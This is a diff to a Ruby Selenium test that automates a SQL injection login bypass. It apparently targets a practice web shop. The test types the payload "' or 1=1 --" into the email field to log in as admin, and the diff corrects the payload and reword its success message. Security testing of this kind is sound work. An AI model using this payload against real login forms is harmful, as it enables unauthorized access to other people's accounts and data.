@@ -21,10 +21,10 @@ describe 'Sqlinjection' do
     element = @driver.find_element(:id, 'navbarAccount')
     @driver.execute_script("arguments[0].click();", element)
     @driver.find_element(:css, '#navbarLoginButton > .mat-icon').click
-    @driver.find_element(:id, 'email').send_keys('\' or 1=1 -')
+    @driver.find_element(:id, 'email').send_keys('\' or 1=1 --')
     @driver.find_element(:id, 'password').send_keys('123')    
     element = @driver.find_element(:css, '#loginButton > .mat-button-wrapper')
     @driver.execute_script("arguments[0].click();", element)
-    print(" --- SQLINJECTION successed ---")
+    print("--- Admin login with SQLINJECTION successed ---\n")
   end
 end
